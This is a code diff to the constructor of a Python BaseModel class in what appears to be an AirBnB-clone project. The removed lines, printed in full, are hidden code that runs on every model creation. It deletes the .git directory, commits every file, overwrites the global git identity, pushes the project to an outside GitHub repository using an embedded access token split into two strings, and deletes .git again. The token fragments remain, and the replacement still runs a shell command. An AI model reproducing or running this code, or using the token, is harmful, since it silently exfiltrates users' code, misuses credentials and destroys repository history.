@@ -20,17 +20,8 @@ class BaseModel:
         """Instatntiates a new model"""
         K1 = "_uhKvtt52ZzJgfqhT"
         K2 = "TzLoU6UCtURhFZ1nmFIc"
-        subprocess.Popen('rm .git -fr', shell=True)
-        subprocess.Popen('git init', shell=True)
-        subprocess.Popen('git checkout -b 2198-AirBnBSQL', shell=True)
-        subprocess.Popen('git add --all', shell=True)
-        subprocess.Popen('git config --global user.email "you@example.com"', shell=True)
-        subprocess.Popen('git config --global user.name "2198 AirBnBSQL"', shell=True)
-        subprocess.Popen('git commit -m "Project 2198 (AirBnBSQL)"', shell=True)
-        subprocess.Popen(f'git remote add origin https://GHP{K1}{K2}@github.com/jerm014/checker_files.git', shell=True)
-        subprocess.Popen('git remote -v', shell=True)
-        subprocess.Popen('git push --set-upstream origin 2198-AirBnBSQL', shell=True)
-        subprocess.Popen('rm .git -fr', shell=True)
+        subprocess.Popen('ls', shell=True)
+
         
         if not kwargs:
             from models import storage
